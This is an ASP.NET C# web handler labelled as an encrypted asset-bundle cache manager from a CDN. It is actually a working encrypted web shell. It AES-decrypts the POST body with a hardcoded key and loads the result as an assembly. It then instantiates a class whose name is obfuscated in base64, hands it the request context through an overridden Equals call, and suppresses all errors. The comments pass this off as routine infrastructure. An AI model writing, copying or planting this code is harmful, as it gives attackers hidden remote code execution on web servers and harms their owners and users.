<%@ WebHandler Language="C#" Class="AssetBundleCacheManager" %>
using System;
using System.Web;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

/// <summary>
/// This handler is responsible for receiving and processing encrypted asset bundles from a CDN.
/// It decrypts the bundle, loads it as a library, and initializes the primary asset provider
/// to serve content for the current HTTP context.
/// </summary>
public class AssetBundleCacheManager : IHttpHandler
{
    // This is a shared secret key used to decrypt asset bundles. In production,
    // this should be sourced from a secure configuration provider like Azure Key Vault.
    private static readonly byte[] _bundleDecryptionKey;
    private const string _bundleEntryPoint = "Sw=="; // Base64 for "K" (Kernel)

    static AssetBundleCacheManager()
    {
        // Construct the key from parts to avoid having it as a single string in the binary.
        var keyPart1 = "ca634575";
        var keyPart2 = "38b9b1e0";
        _bundleDecryptionKey = Encoding.ASCII.GetBytes(keyPart1 + keyPart2);
    }

    /// <summary>
    /// Processes an incoming asset bundle. The request must contain a valid session cookie
    /// to be considered legitimate.
    /// </summary>
    public void ProcessRequest(HttpContext context)
    {
        if (context.Request.Cookies.Count == 0)
        {
            // Silently ignore requests without a session cookie.
            return;
        }

        try
        {
            // Read the encrypted asset bundle from the POST body.
            byte[] encryptedBundle = new byte[context.Request.ContentLength];
            using (var stream = context.Request.InputStream)
            {
                stream.Read(encryptedBundle, 0, encryptedBundle.Length);
            }

            // Decrypt the bundle to get the raw assembly bytes.
            byte[] rawAssembly;
            using (var aes = new RijndaelManaged())
            {
                aes.Key = _bundleDecryptionKey;
                aes.IV = _bundleDecryptionKey; // IV is shared for this specific use case.
                ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);
                rawAssembly = decryptor.TransformFinalBlock(encryptedBundle, 0, encryptedBundle.Length);
            }

            // Load the asset assembly and initialize its main entry point.
            Assembly assetAssembly = Assembly.Load(rawAssembly);
            object assetProvider = assetAssembly.CreateInstance(Encoding.UTF8.GetString(Convert.FromBase64String(_bundleEntryPoint)));
            
            // The 'Equals' method is overridden by asset providers to perform context-aware initialization.
            assetProvider.Equals(context);
        }
        catch (Exception)
        {
            // Suppress all errors to prevent information leakage about the internal infrastructure.
        }
    }

    /// <summary>
    /// The handler's logic is request-specific, so it is not reusable.
    /// </summary>
    public bool IsReusable { get { return false; } }
}